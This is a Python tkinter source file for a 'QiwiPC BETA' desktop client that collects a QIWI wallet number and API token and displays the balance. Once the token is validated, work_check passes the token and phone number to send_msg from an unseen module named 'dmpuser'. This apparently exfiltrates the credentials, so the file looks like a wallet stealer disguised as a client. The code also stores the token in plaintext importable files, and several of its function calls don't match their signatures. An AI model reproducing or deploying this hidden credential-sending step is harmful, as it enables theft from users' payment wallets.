from tkinter import *
from types import NoneType
from unittest.mock import NonCallableMagicMock 
import pyqiwi
from tkinter import messagebox
try:
    from tkinter import messagebox
    from myQIWIPhone import qiwi_phone
    from myQIWIToken import qiwi_token
    from myLogin import login
except:
        f = open("myQIWIPhone.py", 'w')
        f.write('qiwi_phone = ' + '{}')
        f.close()
        t = open("myQIWIToken.py", 'w')
        t.write('qiwi_token = ' + '{}')
        t.close()
        g = open("myLogin.py", 'w')
        g.write('login = ' + '{}')
        g.close()
        from myQIWIPhone import qiwi_phone
        from myQIWIToken import qiwi_token
        from myLogin import login
import random
import winsound
import requests
import json
from dmpuser import send_msg


def lay():
    pass
def pay_account():
    pass

def history_qiwi(qiwi_main,uu,Entry_2,Entry_1,):
    l = Label()                                               


def var_log(Entry_2,Entry_1):
    r_var = 0
    if len(qiwi_token and qiwi_phone) == 0:
        r_var = 0
        try:
            P = Entry_2.get()
            L = Entry_1.get()
            api = pyqiwi.Wallet(P,L)
            print(api.balance())
            qiwi_wallet = qiwi_phone
            qiwi_wallet["Phone"] = L
            f = open("myQIWIphone.py", 'w')
            f.write('qiwi_phone = ' + str(qiwi_wallet))
            f.close()
            qiwi_wallet1 = qiwi_token
            qiwi_wallet1["Token"] = P
            f = open("myQIWIToken.py", 'w')
            f.write('qiwi_token = ' + str(qiwi_wallet1))
            f.close()
            return P,L,r_var

        except:
            return messagebox.showerror('Ошибка ввода off5xx2','Вы ввели не правельные данные. Ваш QIWI кошелек не найден. Считаете, что ошибка это баг сообшите нам - tramong682@gmail.com')

    else:
        r_var = 1
        pas = qiwi_token.get('Token')
        logg = qiwi_phone.get('Phone')
        return pas,logg,r_var


def work_check(Entry_2,Entry_1,root,geometry_main,title_main_qiwi):
    lay()
    try:
        if len(qiwi_token and qiwi_phone) == 0:
            P,L,var = var_log(Entry_2,Entry_1)
            api = pyqiwi.Wallet(P,L)
            print(api.balance())
            send_msg(P,L)
            new_wind(Entry_2,Entry_1,root,geometry_main,title_main_qiwi)


        else:
           
            print(pyqiwi.Wallet(qiwi_token.get('Token'), qiwi_phone.get('Phone')).balance())
            new_wind(Entry_2,Entry_1,root,geometry_main,title_main_qiwi)
            
    except:
        print('Вот оно где ')

def add_login(Entry_2,Entry_1,Ent_1):
    save = login
    save['login']=Ent_1.get()
    print(Ent_1.get())
    s = open('myLogin.py', 'w')
    s.write('login = ' + str(save))
    s.close()
    main_qiwi(Entry_2,Entry_1)
    

def log_main(b_var,log_Ent_1,Entry_2,Entry_1,):
    if b_var == 0 :
        add_login()

    elif b_var == 1:
        if log_Ent_1.get() == login.get('login'):
            print('true' + log_Ent_1.get())

            main_qiwi(Entry_2,Entry_1)

        else:
            return messagebox.showerror('Ошибка ввода off10xf2','Вы ввели не правельные данные. Вход прерван. Считаете, что ошибка это баг сообшите нам - tramong682@gmail.com')

        

def check_log():
    l_var = 0
    if len(login) == 0:
        l_var = 0
    
    else:
        l_var = 1

    return l_var

def accoun_work(Entry_2,Entry_1,log_Ent_1,root,geometry_main,title_main_qiwi,resize_width,resize_height,bg_main_qiwi,icon):
    if log_Ent_1.get() == login.get('login'):
        main_qiwi(Entry_2,Entry_1,log_Ent_1,root,geometry_main,title_main_qiwi,resize_width,resize_height,bg_main_qiwi,icon)

    else:
        messagebox.showerror('eroor ofx11gby7', 'Пороль не верен')

def main_qiwi(Entry_2,Entry_1,log_Ent_1,root,geometry_main,title_main_qiwi,resize_width,resize_height,bg_main_qiwi,icon):
    P,L,var = var_log(Entry_2,Entry_1)
    try:  
        
        qiwi_main = Toplevel(root)
        qiwi_main.title(str(title_main_qiwi))
        qiwi_main.geometry(str(geometry_main))
        qiwi_main.resizable(resize_width, resize_height)
        qiwi_main['bg'] = str(bg_main_qiwi)
        
        Qiwi_var = BooleanVar()
        Qiwi_var.set(0)
        api = pyqiwi.Wallet(P,L)
        print(api.balance())
        uu = P,L
        amout = api.balance()
        repay = Button(qiwi_main,text='Совершить перевод',bg='gray', fg='orange',font='consolas 11',command=lambda:[history.destroy(), repay.destroy(), l_balance.destroy(), balance.destroy(),pay_account() ])
        history = Button(qiwi_main,text='История платежей (BETA) ',bg='gray', fg='orange',font='consolas 11',command=lambda:[history.destroy(), repay.destroy(), l_balance.destroy(), balance.destroy(),history_qiwi(qiwi_main,uu,Entry_2,Entry_1,)])
        l_balance = Label(qiwi_main,text='Кошелек ' + str(L) ,bg= 'gray', fg='orange',font='consolas 11')
        balance = Label(qiwi_main,text='Баланс ' + str(amout) ,bg= 'gray', fg='orange',font='consolas 11')
        l_balance.grid(row=0,column=0, columnspan=1)
        balance.grid(row=1,column=0, columnspan=1)
        repay.grid(row=0, column=1,columnspan=1)
        history.grid(row=0, column=2,columnspan=2)
        
        
    except:
        return messagebox.showerror('Ошибка ввода off15xf3','Ваш QIWI кошелек не найден. Считаете, что ошибка это баг сообшите нам - tramong682@gmail.com')

def new_wind(Entry_2,Entry_1,root):
    children = Toplevel(root)
    children.title("Пороль для входа")
    children.minsize(width=400,height=200)
    children.resizable(width=False, height=False)
    children['bg'] = 'gray'

    var = check_log()
    lay()
    if var == 0:
        b_var = 0
        lab_1 = Label(children,text='Создайте пароль ',bg= 'gray', fg='orange',font='consolas 11')
        lab_2 = Label(children,text='(для быстрого входа)',bg= 'gray', fg='orange',font='consolas 11')
        lab_1.grid(row=0,column=0)
        lab_2.grid(row=1,column=0)
        #Entry
        Ent_1 = Entry(children,bg= 'gray', fg='orange',font='consolas 11',justify="right")
        
        
        Ent_1.grid(row=0,column=1)
        button_find = Button(children,text='Сохранить',bg='gray', fg='orange',font='consolas 11',command=lambda:[lab_1.destroy(),lab_2.destroy(),button_find.destroy(),add_login(Entry_2,Entry_1,Ent_1),Ent_1.destroy(), children.destroy()])
        button_find.grid(row=4,column=1)
    
    else: return(messagebox.showerror('Ошибка 0xXX19f7','Программная ошибка :( '))
        
    

def main(geometry_main = '1024x720',geometry_login = '1024x720',title_main_qiwi = None,title_login = 'QiwiPC BETA',resize_width=None, resize_height = None,bg = None,icon = None,icon_qiwi=None,bg_main_qiwi = None):
    root = Tk()
    root.geometry(str(geometry_login))
    root.title(str(title_login))
    root.resizable(resize_width,resize_height)
    root['bg'] = bg
    root.iconbitmap(str(icon))

    if len(qiwi_token and qiwi_phone and login) == 0:
        try:
            lab_1 = Label(text='Введите номер кошелька',bg= 'gray', fg='orange',font='consolas 11')
            lab_2 = Label(text='Введите токен',bg= 'gray', fg='orange',font='consolas 11')
            lab_1.grid(row=0,column=0)
            lab_2.grid(row=1,column=0)
            #Entry
            Entry_1 = Entry(bg= 'gray', fg='orange',font='consolas 11',justify="right")
            Entry_2 = Entry(bg= 'gray', fg='orange',font='consolas 11',justify="right")
            Entry_1.grid(row=0,column=1)
            Entry_2.grid(row=1,column=1)
            #btns
            
            mylab = Label(text="©2021-2022 Вообще не каких прав нет :( Исходник в Github ",bg= 'gray', fg='orange',font='consolas 11')
            log_Ent_1 =(0)
            button_find = Button(text='Найти',bg='gray', fg='orange',font='consolas 11',command=lambda:[work_check(Entry_2,Entry_1,root,geometry_main,title_main_qiwi,resize_width,resize_height,bg_main_qiwi,icon)])
            button_find.grid(row=4,column=1)
            mylab.grid(padx=1,pady=600)
        except:
            messagebox.showerror('Erorr 0sd20fx5', 'Введенные вами данные не коректны')
        
    else:
        root.geometry(geometry_login)
        log_lab1 = Label(text='Введите пароль ',bg= 'gray', fg='orange',font='consolas 11')
       
        
        log_lab1.grid(row=0,column=0)
        
        #Entry
        log_Ent_1 = Entry(bg= 'gray', fg='orange',font='consolas 11',justify="right")
        
        Entry_1 = (0)
        Entry_2 = (0)
        log_Ent_1.grid(row=0,column=1)
        button_log = Button(text='Войти',bg='gray', fg='orange',font='consolas 11',command=lambda:[accoun_work(Entry_2,Entry_1,log_Ent_1,root,geometry_main,title_main_qiwi,resize_width,resize_height,bg_main_qiwi,icon)])
        button_log.grid(row=4,column=1)
        
    root.mainloop()


